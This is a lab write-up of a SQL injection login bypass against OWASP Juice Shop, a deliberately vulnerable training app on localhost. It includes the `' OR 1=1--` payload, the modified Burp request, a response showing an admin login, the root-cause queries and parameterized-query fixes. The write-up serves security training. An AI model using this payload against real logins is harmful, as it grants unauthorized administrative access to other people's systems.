# Injection – SQL Injection (Authentication Bypass)

## Application Information

**Target:** OWASP Juice Shop
**Testing Tool:** Burp Suite
**Attacker Environment:** Kali Linux

**OWASP Category:** OWASP Top 10 – A05 Injection

---

# 1. Vulnerability Summary

The application is vulnerable to **SQL Injection** in the login authentication mechanism.

User-supplied input in the **email field** is not properly sanitized before being used in the backend SQL query. An attacker can inject SQL statements that manipulate the query logic, allowing authentication bypass.

By injecting a crafted payload into the login request, an attacker can log in as another user, including the **administrator**, without knowing the correct credentials.

This vulnerability allows attackers to gain **unauthorized administrative access** to the application.

---

# 2. Vulnerability Classification

| Category           | Value                 |
| ------------------ | --------------------- |
| OWASP Top 10       | A03 Injection         |
| Vulnerability Type | SQL Injection         |
| Attack Vector      | Login Authentication  |
| Impact             | Authentication Bypass |
| Severity           | Critical              |

---

# 3. Affected Endpoint

```
POST /rest/user/login
```

Example normal request:

```json
{
  "email": "user2@gmail.com",
  "password": "User2"
}
```

---

# 4. Attack Scenario

An attacker manipulates the **email parameter** by injecting SQL syntax that alters the authentication query logic.

Example payload:

```
user2@gmail.com' OR 1=1--
```

This injection causes the authentication condition to always evaluate to **true**, bypassing password verification.

If successful, the application authenticates the attacker as a privileged user.

---

# 5. Steps to Reproduce

## Step 1 — Access the Login Page

Navigate to the application login page.

```
http://localhost:3000/#/login
```

---

## Step 2 — Intercept the Login Request

Use **Burp Suite Proxy** to intercept the login request.

Captured request:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json
```

Request body:

```json
{
  "email": "user2@gmail.com",
  "password": "User2"
}
```

---

## Step 3 — Send Request to Burp Repeater

Right-click the intercepted request and select:

```
Send to Repeater
```

This allows manual manipulation of the request.

---

## Step 4 — Inject SQL Payload

Modify the request body to include the SQL injection payload:

```json
{
  "email": "user2@gmail.com' OR 1=1--",
  "password": "User2"
}
```

---

## Step 5 — Send the Modified Request

Send the manipulated request using **Burp Repeater**.

---

# 6. Proof of Exploitation

The server returns a successful response indicating that authentication was successful.

Response:

```
HTTP/1.1 200 OK
```

Returned JSON:

```json
{
  "authentication": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  },
  "bid": 4,
  "umail": "admin@juice-sh.op"
}
```

The response shows that the authenticated user is:

```
admin@juice-sh.op
```

This confirms that the attacker successfully logged in as the **administrator** without valid credentials.

---

# 7. Impact

An attacker can exploit this vulnerability to gain unauthorized administrative access to the application.

Potential risks include:

* Authentication bypass
* Unauthorized administrative access
* Access to sensitive application data
* Ability to modify or delete data
* Potential compromise of the entire application

In a real-world system, this vulnerability could lead to **complete system compromise**.

---

# 8. Root Cause

The application constructs SQL queries using **unsanitized user input**.

Example vulnerable query:

```sql
SELECT * FROM Users
WHERE email = 'INPUT_EMAIL'
AND password = 'INPUT_PASSWORD';
```

After injection:

```sql
SELECT * FROM Users
WHERE email = 'user2@gmail.com' OR 1=1--'
AND password = 'User2';
```

Explanation:

* `OR 1=1` always evaluates to **true**
* `--` comments out the remainder of the query

This causes the database to return a valid user record without validating the password.

---

# 9. Severity Assessment

| Metric              | Value    |
| ------------------- | -------- |
| Attack Complexity   | Low      |
| Privileges Required | None     |
| User Interaction    | None     |
| Impact              | Critical |

**Estimated Severity:** Critical

---

# 10. Mitigation

The application should implement secure database query practices.

Recommended fixes:

### Use Parameterized Queries

Example:

```sql
SELECT * FROM Users
WHERE email = ?
AND password = ?
```

### Additional Security Measures

* Use prepared statements
* Implement input validation
* Apply ORM frameworks where possible
* Implement Web Application Firewall (WAF)
* Apply least privilege database permissions

---

# 11. Screenshots (Evidence)

Screenshots demonstrating the exploitation:

| Figure   | Description                                      |
|----------|--------------------------------------------------|
| Figure 1 | Login page                                       |
| Figure 2 | Login request intercepted in Burp Suite          |
| Figure 3 | Request sent to Burp Repeater                    |
| Figure 4 | SQL Injection payload inserted and admin login   |
| Figure 5 | Juice Shop challenge solved confirmation         |
| Figure 6 | Comparison of authentication tokens              |

---

# 12. Conclusion

Testing identified a **SQL Injection vulnerability** in the login authentication endpoint of OWASP Juice Shop.

The application fails to properly sanitize user input before executing SQL queries, allowing attackers to manipulate query logic.

This vulnerability allows attackers to bypass authentication and gain administrative access to the application.

Proper use of **parameterized queries and input validation** is required to prevent SQL Injection attacks.